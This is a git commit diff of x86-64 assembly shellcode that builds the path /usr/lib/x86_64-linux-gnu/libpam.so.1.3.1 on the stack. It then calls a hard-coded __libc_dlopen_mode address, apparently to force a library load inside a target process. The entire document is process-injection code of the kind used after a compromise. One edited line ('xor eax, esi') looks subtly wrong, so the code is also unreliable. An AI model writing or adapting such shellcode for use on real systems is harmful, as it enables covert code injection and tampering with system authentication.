3ed828fa2e5dec5020f91df8637732385a9a547b
jm33-m0 <jm33@jm33.me>
2022-02-10 10:00:21 +0800

    dlopen shellcode

--- shellcode/dlopen.asm
+++ shellcode/dlopen.asm
@@ -4,16 +4,27 @@
 	global  _start
 
 _start:
-	xor  eax, eax
+	xor  eax, esi
 	xor  edi, edi
 	xor  esi, esi
-	push rdi; '\0' terminates string
-
-	;;     char *filename
-	;[push filename here]
-
-	mov sil, 2
-
-	mov  rax, 0x7f040c32d930
+	xor  edx, edx
+	xor  ecx, ecx
+	xor  ebx, ebx
+	push rdi
+	mov  rdi, 0x312e332e312e6f73
+	push rdi
+	mov  rdi, 0x2e6d617062696c2f
+	push rdi
+	mov  rdi, 0x756e672d78756e69
+	push rdi
+	mov  rdi, 0x6c2d34365f363878
+	push rdi
+	mov  rdi, 0x2f62696c2f727375
+	push rdi
+	mov  rdi, 0x2f00000000000000
+	push rdi
+	add  rsp, 7
+	mov  rdi, rsp
+	mov  sil, 2
+	mov  rax, 0x7fdbd84e9800; change me to real __libc_dlopen_mode address
 	call rax
-	int3
